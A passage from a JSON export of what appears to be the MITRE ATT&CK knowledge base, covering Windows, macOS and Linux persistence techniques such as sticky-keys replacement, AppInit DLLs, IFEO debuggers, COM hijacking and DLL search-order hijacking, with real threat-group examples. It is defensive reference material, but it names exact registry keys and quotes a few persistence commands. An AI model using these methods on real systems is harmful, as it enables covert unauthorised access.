long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.", "id": "T1546.006", "examples": []}, {"name": "Netsh Helper DLL", "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.", "id": "T1546.007", "examples": [{"id": "S0108", "name": "netsh", "description": "netsh can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed."}]}, {"name": "Accessibility Features", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\nTwo common accessibility programs are C:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times and C:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen.\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP).  The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges.\nOther accessibility features exist that may also be leveraged in a similar fashion:", "id": "T1546.008", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 used sticky-keys to obtain unauthenticated, privileged console access."}, {"id": "G0022", "name": "APT3", "description": "APT3 replaces the Sticky Keys binary C:\\Windows\\System32\\sethc.exe for persistence."}, {"id": "G0096", "name": "APT41", "description": "APT41 leveraged sticky keys to establish persistence."}, {"id": "G0001", "name": "Axiom", "description": "Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions."}, {"id": "S0363", "name": "Empire", "description": "Empire can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used sticky keys to launch a command prompt."}]}, {"name": "AppCert DLLs", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. ", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. \nSimilar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.", "id": "T1546.009", "examples": [{"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can establish using a AppCertDLLs Registry key."}]}, {"name": "AppInit DLLs", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. ", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. \nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.  Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.", "id": "T1546.010", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows in order to establish persistence."}, {"id": "S0107", "name": "Cherry Picker", "description": "Some variants of Cherry Picker use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\""}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can insert itself into the address space of other applications using the AppInit DLL Registry key."}, {"id": "S0098", "name": "T9000", "description": "If a victim meets certain criteria, T9000 uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs \u2013 %APPDATA%\\Intel\\ResN32.dll and HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs \u2013 0x1."}]}, {"name": "Application Shimming", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. ", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\nCustom databases are stored in:\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs.", "id": "T1546.011", "examples": [{"id": "G0046", "name": "FIN7", "description": "FIN7 has used application shim databases for persistence."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has used a malicious shim database to maintain persistence."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has installed shim databases in the AppPatch folder."}]}, {"name": "Image File Execution Options Injection", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., C:\\dbg\\ntsd.exe -g  notepad.exe). ", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., C:\\dbg\\ntsd.exe -g  notepad.exe). \nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  IFEOs are represented as Debugger values in the Registry under HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ where <executable> is the binary on which the debugger is attached.\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).   Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\.\nSimilar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges.\nSimilar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\nMalware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.", "id": "T1546.012", "examples": [{"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles modified and added entries within HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options to maintain persistence."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST created an Image File Execution Options (IFEO) Debugger registry value for the process dllhost.exe to trigger the installation of Cobalt Strike."}]}, {"name": "PowerShell Profile", "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.", "detailed_description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.\nPowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the -NoProfile flag is used when it is launched.\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.", "id": "T1546.013", "examples": [{"id": "G0010", "name": "Turla", "description": "Turla has used PowerShell profiles to maintain persistence on an infected machine."}]}, {"name": "Emond", "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.", "detailed_description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the Launch Daemon configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.", "id": "T1546.014", "examples": []}, {"name": "Component Object Model Hijacking", "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry.\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.", "id": "T1546.015", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious can use COM hijacking to establish persistence."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A})."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has modified ComSysApp service to load the malicious DLL payload."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito uses COM hijacking as a method of persistence."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has created the HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32 Registry key for persistence."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can add a CLSID key for payload execution through Registry.CurrentUser.CreateSubKey(\"Software\\\\Classes\\\\CLSID\\\\{\" + clsid + \"}\\\\InProcServer32\")."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has created the HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{E6D34FFC-AD32-4d6a-934C-D387FA873A19} Registry key for persistence."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT  can perform COM hijacking by setting the path to itself to the HKCU\\Software\\Classes\\Folder\\shell\\open\\command key with a DelegateExecute parameter."}]}, {"name": "Installer Packages", "description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.", "detailed_description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS postinstall scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a Launch Daemon) with the elevated permissions.\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include preinst, postinst, prerm, postrm scripts and run as root when executed.\nFor Windows, the Microsoft Installer services uses .msi files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.", "id": "T1546.016", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "During AppleJeus's installation process, it uses postinstall scripts to extract a hidden plist from the application's /Resources folder and execute the plist file as a Launch Daemon with elevated permissions."}]}, {"name": "Udev Rules", "description": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the /dev directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with match keys to specify the conditions a hardware event must meet and action keys to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in /etc/udev/rules.d/, /run/udev/rules.d/, /usr/lib/udev/rules.d/, /usr/local/lib/udev/rules.d/, and /lib/udev/rules.d/. Rule priority is determined by both directory and by the digit prefix in the rule filename.", "detailed_description": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the /dev directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with match keys to specify the conditions a hardware event must meet and action keys to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in /etc/udev/rules.d/, /run/udev/rules.d/, /usr/lib/udev/rules.d/, /usr/local/lib/udev/rules.d/, and /lib/udev/rules.d/. Rule priority is determined by both directory and by the digit prefix in the rule filename.\nAdversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as /dev/random, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key RUN+= to detach and run the malicious content\u2019s process in the background to bypass these controls.", "id": "T1546.017", "examples": []}]}, {"name": "External Remote Services", "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.", "detailed_description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.", "id": "T1133", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. "}, {"id": "G1024", "name": "Akira", "description": "Akira uses compromised VPN accounts for initial access to victim networks."}, {"id": "G0026", "name": "APT18", "description": "APT18 actors leverage legitimate credentials to log into external remote services."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used compromised identities to access networks via VPNs and Citrix."}, {"id": "G0096", "name": "APT41", "description": "APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used VPN access to persist in the victim environment."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment."}, {"id": "S0600", "name": "Doki", "description": "Doki was executed through an open Docker daemon API port."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear have used VPNs both for initial access to victim environments and for persistence within them following compromise."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN)."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard was executed through an unsecure kubelet that allowed anonymous access to the victim environment."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has gained access through VPNs including with compromised accounts and stolen VPN certificates."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used RDP to establish persistence."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing was executed in an Ubuntu container deployed via an open Docker daemon API."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. "}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit attempts to gain access to the server via SSH."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can establish an SSH connection from a compromised host to a server."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems."}, {"id": "G0049", "name": "OilRig", "description": "OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used stolen credentials to connect to the victim's network via VPN."}, {"id": "G1040", "name": "Play", "description": "Play has used Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has leveraged legitimate remote management tools to maintain persistent access."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments. TeamTNT has also targeted exposed kubelets for Kubernetes environments."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services. Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used VPNs to connect to victim environments and enable post-exploitation actions."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure."}], "sub_techniques": []}, {"name": "Hijack Execution Flow", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.", "id": "T1574", "examples": [{"id": "C0017", "name": "C0017", "description": "During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER will remove and write malicious shared objects associated with legitimate system functions such as read(2)."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate edits the Registry key HKCU\\Software\\Classes\\mscfile\\shell\\open\\command to execute a malicious AutoIt script. When eventvwr.exe is executed, this will call the Microsoft Management Console (mmc.exe), which in turn references the modified Registry key."}, {"id": "S0354", "name": "Denis", "description": "Denis replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe."}, {"id": "S0567", "name": "Dtrack", "description": "One of Dtrack can replace the normal flow of a program execution with malicious code."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor uses a legitimate executable to load a malicious DLL file for installation."}, {"id": "C0036", "name": "Pikabot Distribution February 2024", "description": "Pikabot Distribution February 2024 utilized a tampered legitimate executable, grepWinNP3.exe, for its first stage Pikabot loader, modifying the open-source tool to execute malicious code when launched."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will drop a copy of itself to a subfolder in %Program Data% or %Program Data%\\Microsoft\\ to attempt privilege elevation and defense evasion if not running in Session 0."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot will use the malicious file slideshow.mp4 if present to load the core API provided by ntdll.dll to avoid any hooks placed on calls to the original ntdll.dll file by endpoint detection and response or antimalware software."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls."}], "sub_techniques": [{"name": "DLL Search Order Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.", "id": "T1574.001", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 has used search order hijacking to execute malicious payloads, such as Winnti for Windows."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST involved the use of DLL search order hijacking to execute 